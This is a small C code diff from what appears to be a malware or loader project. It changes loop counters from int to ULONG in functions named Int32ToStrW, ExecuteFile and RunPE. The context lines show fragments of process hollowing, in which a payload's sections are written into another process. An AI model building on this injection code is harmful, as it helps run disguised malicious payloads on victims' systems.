@@ -90,13 +90,13 @@ PWCHAR Int32ToStrW(LONG value, PWCHAR buffer)
 			value = -value;
 		}
 
-		INT length = 0;
+		ULONG length = 0;
 		for (LONG i = value; i; i /= 10)
 		{
 			length++;
 		}
 
-		for (INT i = 0; i < length; i++)
+		for (ULONG i = 0; i < length; i++)
 		{
 			buffer[length - i - 1] = L'0' + value % 10;
 			value /= 10;
@@ -450,7 +450,7 @@ BOOL ExecuteFile(LPCWSTR path, BOOL deleteFile)
 
 	if (deleteFile)
 	{
-		for (int i = 0; i < 10; i++)
+		for (ULONG i = 0; i < 10; i++)
 		{
 			if (DeleteFileW(path)) break;
 			Sleep(100);
@@ -784,7 +784,7 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 					{
 						BOOL sectionsWritten = TRUE;
 						PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(ntHeaders);
-						for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
+						for (ULONG j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
 						{
 							if (!WriteProcessMemory(processInformation.hProcess, (LPBYTE)imageBase + sectionHeaders[j].VirtualAddress, (LPBYTE)payload + sectionHeaders[j].PointerToRawData, sectionHeaders[j].SizeOfRawData, NULL))
 							{
@@ -855,7 +855,7 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 					{
 						BOOL sectionsWritten = TRUE;
 						PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(ntHeaders);
-						for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
+						for (ULONG j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
 						{
 							if (!WriteProcessMemory(processInformation.hProcess, (LPBYTE)imageBase + sectionHeaders[j].VirtualAddress, (LPBYTE)payload + sectionHeaders[j].PointerToRawData, sectionHeaders[j].SizeOfRawData, NULL))
 							{
